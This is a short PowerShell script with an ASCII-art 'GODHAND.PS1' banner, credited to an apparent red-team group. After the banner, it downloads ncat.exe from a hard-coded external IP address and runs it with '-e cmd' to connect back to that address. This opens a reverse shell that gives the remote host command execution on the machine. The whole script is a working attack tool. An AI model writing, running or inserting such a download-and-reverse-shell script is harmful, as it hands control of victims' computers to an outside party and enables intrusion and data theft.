Clear-Host
Write-Host ""
Write-Host ""

Write-Host -Fore Red 
"                                                                                             
 @@@@@@@@   @@@@@@   @@@@@@@   @@@  @@@   @@@@@@   @@@  @@@  @@@@@@@        @@@@@@@    @@@@@@     @@@  
@@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@@  @@@@ @@@  @@@@@@@@       @@@@@@@@  @@@@@@@    @@@@  
!@@        @@!  @@@  @@!  @@@  @@!  @@@  @@!  @@@  @@!@!@@@  @@!  @@@       @@!  @@@  !@@       @@@!!  
!@!        !@!  @!@  !@!  @!@  !@!  @!@  !@!  @!@  !@!!@!@!  !@!  @!@       !@!  @!@  !@!         !@!  
!@! @!@!@  @!@  !@!  @!@  !@!  @!@!@!@!  @!@!@!@!  @!@ !!@!  @!@  !@!       @!@@!@!   !!@@!!      @!@  
!!! !!@!!  !@!  !!!  !@!  !!!  !!!@!!!!  !!!@!!!!  !@!  !!!  !@!  !!!       !!@!!!     !!@!!!     !@!  
:!!   !!:  !!:  !!!  !!:  !!!  !!:  !!!  !!:  !!!  !!:  !!!  !!:  !!!       !!:            !:!    !!:  
:!:   !::  :!:  !:!  :!:  !:!  :!:  !:!  :!:  !:!  :!:  !:!  :!:  !:!  :!:  :!:           !:!     :!:  
 ::: ::::  ::::: ::   :::: ::  ::   :::  ::   :::   ::   ::   :::: ::  :::   ::       :::: ::     :::  
 :: :: :    : :  :   :: :  :    :   : :   :   : :  ::    :   :: :  :   :::   :        :: : :       ::  
                                                                                                       
" 

Write-Host -Fore Red "          Eren Perakende Red Team"  
Write-Host -Fore Gray "          https://github.com/dheenaxe/ErenRedTeam"
Write-Host ""
Write-Host ""

if (-not (Test-Path "C:\eren")) {
    New-Item -Path "C:\eren" -ItemType Directory -Force
}

if (-not (Test-Path "C:\eren\godhand")) {
    New-Item -Path "C:\eren\godhand" -ItemType Directory -Force
}

if (-not (Test-Path "C:\eren\godhand\ncat.exe")) {
    Start-BitsTransfer -Source "http://78.129.240.79:8080/ncat.exe" -Destination "C:\eren\godhand\ncat.exe"
}

Start-Process -FilePath "C:\eren\godhand\ncat.exe" -ArgumentList "78.129.240.79", "9001", "-e", "cmd" -NoNewWindow -Wait
